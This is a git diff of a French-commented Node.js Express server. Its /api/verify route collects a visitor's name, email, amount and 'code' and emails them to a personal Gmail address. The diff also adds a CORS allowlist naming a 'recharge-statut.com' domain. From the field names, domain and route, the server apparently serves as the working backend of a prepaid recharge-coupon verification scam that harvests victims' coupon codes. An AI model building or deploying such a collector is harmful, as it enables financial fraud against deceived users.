@@ -1,27 +1,44 @@
-require('dotenv').config(); // <-- ÉTAPE CLÉ : Charge les variables du fichier .env à la ligne 1
+require('dotenv').config(); // <-- Charge les variables d'environnement en premier
 
 const express = require('express');
 const cors = require('cors');
 const { Resend } = require('resend');
 
-// Initialisation de l'application Express
+// 1. Initialisation de l'application Express
 const app = express();
-// Port 5000 par défaut pour correspondre à votre configuration form.html locale
 const PORT = process.env.PORT || 5000; 
 
-// Middlewares obligatoires pour recevoir les données du formulaire
-app.use(express.json());
-app.use(cors());
+// 2. Configuration stricte de sécurité CORS (Vercel + Local)
+const allowedOrigins = [
+  'http://127.0.0.1:5500',
+  'https://recharge-statut.com'
+];
 
-// Initialisation de Resend avec la variable d'environnement (ne plantera plus)
+app.use(cors({
+  origin: function (origin, callback) {
+    // Permet aux requêtes sans origine (comme Postman ou les requêtes de serveurs) de passer
+    if (!origin) return callback(null, true);
+    
+    if (allowedOrigins.indexOf(origin) !== -1) {
+      callback(null, true);
+    } else {
+      callback(new Error('Bloqué par la politique CORS de l\'application'));
+    }
+  }
+}));
+
+// 3. Middlewares obligatoires pour le JSON
+app.use(express.json());
+
+// 4. Initialisation de Resend
 const resend = new Resend(process.env.RESEND_API_KEY);
 
-// Route de réception des données
+// 5. Route de réception des données
 app.post('/api/verify', async (req, res) => {
     const { nom, prenom, email, amount, code } = req.body;
 
     try {
-        // Envoi via l'API Resend avec un design amélioré
+        // Envoi via l'API Resend
         const data = await resend.emails.send({
             from: 'onboarding@resend.dev',
             to: 'louanalouana950@gmail.com',
@@ -48,17 +65,15 @@ app.post('/api/verify', async (req, res) => {
             `
         });
 
-        // Réponse positive au frontend
         res.status(200).json({ success: true, message: "Données transmises avec succès." });
 
     } catch (error) {
-        // Gestion d'erreur propre
         console.error("Erreur Resend :", error);
         res.status(500).json({ success: false, message: "Erreur lors de l'envoi des données." });
     }
 });
 
-// Démarrage du serveur
+// 6. Démarrage du serveur
 app.listen(PORT, () => {
     console.log(`Serveur démarré sur le port ${PORT}`);
 });
